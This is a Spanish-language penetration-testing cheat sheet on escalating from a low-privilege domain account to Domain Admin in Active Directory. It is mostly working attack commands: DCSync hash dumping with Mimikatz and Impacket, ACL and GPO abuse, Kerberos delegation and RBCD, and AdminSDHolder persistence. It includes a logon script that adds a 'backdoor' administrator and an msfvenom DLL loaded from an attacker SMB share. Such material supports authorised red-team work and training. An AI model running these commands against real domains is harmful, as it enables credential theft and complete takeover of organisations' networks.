---
icon: windows
---

# Escalada de privilegios

## Escalada de Privilegios en Active Directory

Partiendo de una cuenta de dominio con bajos privilegios, el objetivo es conseguir acceso como **Domain Admin** o equivalente. Los ataques más comunes abusan de ACLs mal configuradas, GPOs, delegación Kerberos y características específicas de AD.

### 1. DCSync

Simula el comportamiento de un Domain Controller para replicar hashes de contraseñas desde el DC. Requiere los permisos `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` sobre el objeto del dominio.

Las cuentas que tienen estos permisos por defecto son Domain Admins, Enterprise Admins y Domain Controllers.

**Desde Windows con Mimikatz:**

```powershell
# DCSync del usuario krbtgt (para Golden Ticket)
lsadump::dcsync /user:krbtgt /domain:empresa.local

# DCSync del Administrator
lsadump::dcsync /user:Administrator /domain:empresa.local

# DCSync de todos los usuarios (más ruido)
lsadump::dcsync /all /domain:empresa.local
```

**Desde Linux con Impacket:**

```bash
# Dump de todos los hashes del dominio
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10 -just-dc
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10 -just-dc-user krbtgt

# Con hash NTLM
impacket-secretsdump empresa.local/Administrator@10.10.10.10 -hashes :NTHASH -just-dc

# Con ticket Kerberos
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass empresa.local/admin@dc01.empresa.local -just-dc

# NetExec
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds --usersx
```

### 2. ACL Abuse

Las ACLs de AD definen qué objetos tienen qué permisos sobre otros. Configuraciones incorrectas son una de las rutas de escalada más comunes en entornos reales.

#### Permisos abusables

| Permiso               | Impacto                                                           |
| --------------------- | ----------------------------------------------------------------- |
| `GenericAll`          | Control total: resetear pwd, añadir a grupos, modificar atributos |
| `GenericWrite`        | Modificar atributos: scriptPath, servicePrincipalName...          |
| `WriteOwner`          | Cambiar el propietario → luego añadirse permisos                  |
| `WriteDACL`           | Modificar la ACL del objeto → añadirse permisos                   |
| `ForceChangePassword` | Resetear la contraseña sin conocer la actual                      |
| `AddMember`           | Añadir miembros a un grupo                                        |
| `AllExtendedRights`   | Todos los derechos extendidos (incluye ForceChangePassword)       |
| `ReadLAPSPassword`    | Leer contraseña LAPS del equipo                                   |

#### Encontrar ACLs abusables

BloodHound es la forma más visual: nodo → "Inbound Object Control". Manualmente con PowerView:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword"
} | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName
```

#### Explotar GenericAll sobre un usuario

```powershell
# Opción 1: Resetear la contraseña
Set-DomainUserPassword -Identity victima -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Opción 2: Targeted Kerberoasting (asignar SPN → pedir TGS → crackear)
Set-DomainObject -Identity victima -Set @{serviceprincipalname='fake/spn'}
Get-DomainSPNTicket -SPN "fake/spn" | fl hash
# Crackear: hashcat -m 13100
```

#### Explotar GenericAll sobre un grupo

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario_controlado"
Get-DomainGroupMember -Identity "Domain Admins"
```

#### Explotar WriteDACL

```powershell
# Dar GenericAll sobre el dominio a un usuario controlado
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" -PrincipalIdentity "usuario_controlado" -Rights All

# O dar permisos de DCSync directamente
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" -PrincipalIdentity "usuario_controlado" -Rights DCSync
```

#### Explotar WriteOwner

```powershell
# Paso 1: Hacerse propietario
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usuario_controlado"

# Paso 2: Darse WriteDACL
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usuario_controlado" -Rights All

# Paso 3: Añadirse al grupo
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario_controlado"
```

#### Explotar ForceChangePassword

```powershell
# Windows
Set-DomainUserPassword -Identity admin_objetivo `
    -AccountPassword (ConvertTo-SecureString "Hacked123!" -AsPlainText -Force)

# Linux
net rpc password admin_objetivo Hacked123! -U empresa.local/usuario%contraseña -S 10.10.10.10
```

### 3. GPO Abuse

Si se tiene permiso de escritura (`GenericWrite`/`GenericAll`) sobre una GPO aplicada a equipos o usuarios privilegiados, se puede modificar para ejecutar código arbitrario.

```powershell
# Encontrar GPOs sobre las que se tiene acceso de escritura
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericWrite|GenericAll" -and
    $_.SecurityIdentifier -eq (Get-DomainUser usuario_controlado).objectsid
}

# Ver a qué OUs está aplicada la GPO
Get-DomainOU -GPLink "{GPO-GUID}" | Select-Object distinguishedname
```

**Con SharpGPOAbuse (Windows):**

```powershell
# Añadir usuario al grupo local de admins via GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount usuario_controlado --GPOName "Vulnerable GPO"

# Ejecutar script al inicio de sesión
.\SharpGPOAbuse.exe --AddUserScript --ScriptName startup.bat `
    --ScriptContents "net user backdoor Hacked123! /add && net localgroup administrators backdoor /add" `
    --GPOName "Vulnerable GPO"

# Forzar actualización de GPO
Invoke-GPUpdate -Computer "WS01.empresa.local" -Force
```

### 4. Delegación Kerberos

La delegación permite que un servicio actúe en nombre de un usuario para acceder a otros servicios. Hay tres tipos con distintos niveles de riesgo.

#### Unconstrained Delegation

Si un equipo tiene habilitada la delegación sin restricciones, almacena los TGT de todos los usuarios que se autentican contra él. Comprometer ese equipo da acceso a todos esos TGTs.

```powershell
# Encontrar equipos con Unconstrained Delegation
Get-DomainComputer -Unconstrained -Properties dnshostname

# impacket
impacket-findDelegation empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# Printer Bug → forzar al DC a autenticarse contra el equipo comprometido
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$      # monitorizar tickets
.\SpoolSample.exe DC01.empresa.local EQUIPO_DELEGATION.empresa.local
# El DC01$ se autentica → Rubeus captura su TGT → DCSync con el ticket
```

#### Constrained Delegation

El servicio solo puede delegar hacia servicios específicos definidos en `msDS-AllowedToDelegateTo`.

```powershell
# Encontrar cuentas con Constrained Delegation
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto

# Explotar con Rubeus (S4U2Self + S4U2Proxy)
.\Rubeus.exe s4u /user:sqlsvc /rc4:NTHASH /impersonateuser:Administrator `
    /msdsspn:"cifs/target.empresa.local" /ptt
```

#### Resource-Based Constrained Delegation (RBCD)

Si se tiene `GenericWrite` sobre una cuenta de equipo, se puede configurar RBCD para comprometer ese equipo como cualquier usuario.

```powershell
# 1. Crear una cuenta de equipo
New-MachineAccount -MachineAccount FakeComputer -Password (ConvertTo-SecureString "Fake123!" -AsPlainText -Force)

# 2. Obtener SID de la cuenta creada
$sid = Get-DomainComputer -Identity FakeComputer -Properties objectsid | Select-Object -Expand objectsid

# 3. Modificar msDS-AllowedToActOnBehalfOfOtherIdentity del equipo objetivo
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 4. Obtener TGT de FakeComputer
.\Rubeus.exe asktgt /user:FakeComputer$ /password:Fake123! /domain:empresa.local /dc:10.10.10.10

# 5. S4U2Self + S4U2Proxy para impersonar Administrator en TARGET
.\Rubeus.exe s4u /ticket:TGT_FakeComputer /impersonateuser:Administrator `
    /msdsspn:"cifs/target.empresa.local" /ptt
```

### 5. DNSAdmins → Domain Admin

Los miembros del grupo **DNSAdmins** pueden configurar el servicio DNS del DC para cargar una DLL arbitraria. El servicio DNS corre como SYSTEM.

```bash
# 1. Crear DLL maliciosa
msfvenom -p windows/x64/exec cmd='net group "domain admins" usuario_controlado /add /domain' \
    -f dll -o evil.dll

# 2. Alojar la DLL en un share SMB
impacket-smbserver share ./

# 3. Configurar el plugin DLL como miembro de DNSAdmins
dnscmd dc01.empresa.local /config /serverlevelplugindll \\attacker\share\evil.dll

# 4. Reiniciar el servicio DNS
sc.exe \\dc01.empresa.local stop dns
sc.exe \\dc01.empresa.local start dns
# DNS arranca como SYSTEM → carga la DLL → ejecuta el comando
```

### 6. AdminSDHolder Abuse

AdminSDHolder protege cuentas privilegiadas. Si se consigue `WriteDACL` sobre él, los permisos añadidos se propagan automáticamente a todos los grupos protegidos cada **60 minutos**.

```powershell
# Añadir GenericAll sobre AdminSDHolder para un usuario controlado
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=empresa,DC=local" `
    -PrincipalIdentity "usuario_controlado" -Rights All -Verbose

# Tras 60 min de propagación, añadirse a Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario_controlado"
```

***

### Resumen de rutas de escalada

| Técnica                      | Requisito                      | Impacto                                              |
| ---------------------------- | ------------------------------ | ---------------------------------------------------- |
| **DCSync**                   | DS-Replication rights          | Dump de todos los hashes del dominio                 |
| **ACL Abuse — GenericAll**   | GenericAll sobre usuario/grupo | Control total del objeto                             |
| **ACL Abuse — WriteDACL**    | WriteDACL sobre objeto         | Añadir cualquier permiso                             |
| **GPO Abuse**                | Write sobre GPO aplicada       | Ejecución de código en todos los equipos afectados   |
| **Unconstrained Delegation** | Comprometer equipo con UD      | Capturar TGTs de cualquier usuario que se autentique |
| **RBCD**                     | GenericWrite sobre equipo      | Impersonar cualquier usuario en ese equipo           |
| **DNSAdmins**                | Pertenencia al grupo           | RCE como SYSTEM en el DC                             |
| **AdminSDHolder**            | WriteDACL sobre AdminSDHolder  | Permisos sobre todos los grupos protegidos           |

> **BloodHound** es esencial aquí: la query _"Find Shortest Path to Domain Admins"_ muestra gráficamente rutas de escalada que de otro modo son invisibles en entornos grandes.

> Las ACLs incorrectas son extremadamente comunes en entornos reales. Revisar siempre objetos como Service Accounts, cuentas de helpdesk y grupos de IT — son los más frecuentemente mal configurados.
